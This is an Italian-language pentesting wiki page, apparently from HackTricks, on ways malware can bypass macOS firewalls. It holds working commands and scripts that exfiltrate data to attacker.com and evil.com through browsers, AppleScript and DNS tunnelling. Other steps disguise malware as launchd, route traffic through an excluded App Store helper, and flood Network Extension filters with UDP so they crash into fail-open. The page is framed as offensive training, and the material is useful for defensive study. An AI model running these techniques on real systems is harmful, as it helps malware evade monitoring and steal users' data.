# Bypassing dei firewall su macOS

{{#include ../../banners/hacktricks-training.md}}

## Tecniche individuate

Le seguenti tecniche sono risultate funzionanti in alcune app firewall per macOS.

### Abuso dei nomi nella whitelist

- Ad esempio, chiamando il malware con nomi di processi macOS noti come **`launchd`**

### Synthetic Click

- Se il firewall chiede l'autorizzazione all'utente, fare in modo che il malware **faccia clic su allow**

### **Utilizzare binari firmati da Apple**

- Come **`curl`**, ma anche altri come **`whois`**

### Domini Apple noti

Il firewall potrebbe consentire connessioni verso domini Apple noti come **`apple.com`** o **`icloud.com`**. Inoltre, iCloud potrebbe essere utilizzato come C2.

### Bypass generico

Alcune idee da provare per bypassare i firewall

### Verificare il traffico consentito

Conoscere il traffico consentito aiuterà a identificare i domini potenzialmente presenti nella whitelist o quali applicazioni sono autorizzate ad accedervi
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

Su macOS un processo **non comunica** direttamente con il server DNS. La risoluzione dei nomi viene gestita tramite **XPC** da **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), un system daemon firmato da Apple; pertanto ogni lookup eseguito sulla macchina esce dall'host come traffico **proveniente da `mDNSResponder`**, invece che dal processo che lo ha richiesto. I firewall tendono quindi a considerare quel daemon sempre attendibile: negargli l'accesso interromperebbe la risoluzione dei nomi per l'intero sistema.<sup>[1]</sup>

Questo rende il DNS un canale che rimane aperto anche quando il firewall blocca i socket del malware:<sup>[1]</sup>

1. Il malware tenta di connettersi a `evil.com`. La sua **connessione in uscita** viene esaminata dal firewall e **bloccata**.
2. Il malware chiede invece a `mDNSResponder` di **risolvere** `evil.com`, tramite XPC.
3. Il firewall esamina la query risultante, vede come originator il resolver attendibile firmato da Apple e **la autorizza**.
4. La query raggiunge il server DNS e, se l'attaccante gestisce il server authoritative per `evil.com`, controlla entrambe le estremità dello scambio.

Poiché l'attaccante possiede quella zone, non è mai necessaria alcuna "connessione": i dati vengono sottratti all'interno delle **label richieste** (ad esempio `<encoded-chunk>.evil.com`) e i comandi ritornano all'interno degli **answer records** (TXT, A, CNAME…), realizzando il classico DNS tunnelling attraverso un processo completamente whitelisted.

Qualsiasi processo senza privilegi può interagire direttamente con il daemon; questo è un modo semplice per confermare che il percorso è aperto:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Tramite le app del browser

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Tramite process injection

Se puoi **iniettare codice in un processo** autorizzato a connettersi a qualsiasi server, potresti bypassare le protezioni del firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilità recenti per il bypass del firewall di macOS (2023-2025)

### Bypass del filtro dei contenuti web (Screen Time) – **CVE-2024-44206**
Nel luglio 2024 Apple ha corretto un bug critico in Safari/WebKit che comprometteva il “Web content filter” a livello di sistema, utilizzato dai controlli parentali di Screen Time.
Un URI appositamente creato (ad esempio, con “://” sottoposto a doppia codifica URL) non viene riconosciuto dall'ACL di Screen Time, ma viene accettato da WebKit; la richiesta viene quindi inviata senza filtraggio. Di conseguenza, qualsiasi processo in grado di aprire un URL (incluso codice in sandbox o non firmato) può raggiungere domini esplicitamente bloccati dall'utente o da un profilo MDM.<sup>[2]</sup>

Test pratico (su un sistema non aggiornato):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug nell'ordinamento delle regole di Packet Filter (PF) nelle prime versioni di macOS 14 “Sonoma”
Durante il ciclo beta di macOS 14, Apple ha introdotto una regressione nel wrapper userspace attorno a **`pfctl`**.
Le regole aggiunte con la keyword `quick` (utilizzata da molti kill-switch delle VPN) venivano silenziosamente ignorate, causando leak del traffico anche quando la GUI della VPN/firewall mostrava *bloccato*. Il bug è stato confermato da diversi fornitori di VPN e risolto nella RC 2 (build 23A344).

Controllo rapido del leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusare dei servizi helper firmati da Apple (legacy – pre-macOS 11.2)
Prima di macOS 11.2, **`ContentFilterExclusionList`** consentiva a circa 50 binari Apple, come **`nsurlsessiond`** e l’App Store, di bypassare tutti i socket-filter firewall implementati con il framework Network Extension (LuLu, Little Snitch, ecc.).
Il malware poteva semplicemente avviare un processo escluso — oppure iniettare codice al suo interno — e instradare il proprio traffico attraverso il socket già autorizzato. Apple ha rimosso completamente la exclusion list in macOS 11.2, ma la tecnica è ancora rilevante sui sistemi che non possono essere aggiornati.<sup>[3]</sup>

Esempio di proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH per eludere i filtri di dominio Network Extension (macOS 12+)
NEFilter Packet/Data Providers si basano su SNI/ALPN del TLS ClientHello. Con **HTTP/3 su QUIC (UDP/443)** e **Encrypted Client Hello (ECH)**, l'SNI rimane cifrato, NetExt non può analizzare il flusso e le regole hostname spesso adottano un comportamento fail-open, consentendo al malware di raggiungere domini bloccati senza interagire con il DNS.<sup>[5]</sup>

PoC minimale:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Se QUIC/ECH è ancora abilitato, questo è un semplice percorso di evasion del filtro degli hostname.

### Instabilità di Network Extension su macOS 15 “Sequoia” (2024–2025)
Le prime build 15.0/15.1 mandano in crash i filtri **Network Extension** di terze parti (LuLu, Little Snitch, Defender, SentinelOne, ecc.). Quando il filtro si riavvia, macOS elimina le regole dei flussi e molti prodotti adottano un comportamento fail-open. Inondare il filtro con migliaia di brevi flussi UDP (o forzare QUIC/ECH) può causare ripetutamente il crash e lasciare una finestra per C2/exfil mentre la GUI continua a indicare che il firewall è in esecuzione.<sup>[4]</sup>

Riproduzione rapida (macchina di laboratorio sicura):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Suggerimenti sugli strumenti per le versioni moderne di macOS

1. Ispeziona le regole PF attuali generate dai firewall con interfaccia grafica:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Elenca i binari che dispongono già dell’entitlement *outgoing-network* (utile per il piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registra programmaticamente il tuo content filter di Network Extension in Objective-C/Swift.
Un PoC rootless minimale che inoltra i pacchetti a un socket locale è disponibile nel codice sorgente di **LuLu** di Patrick Wardle.

## Riferimenti

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: creazione e aggiramento dei firewall di macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Il bypass del web content filter di Apple consente l’accesso illimitato ai contenuti bloccati (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple rimuove la funzionalità di macOS che consentiva alle app di aggirare la sicurezza del firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [I prodotti di cybersecurity smettono di funzionare dopo l’aggiornamento a macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Utilizzare la protezione di rete per impedire le connessioni di macOS a siti dannosi - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
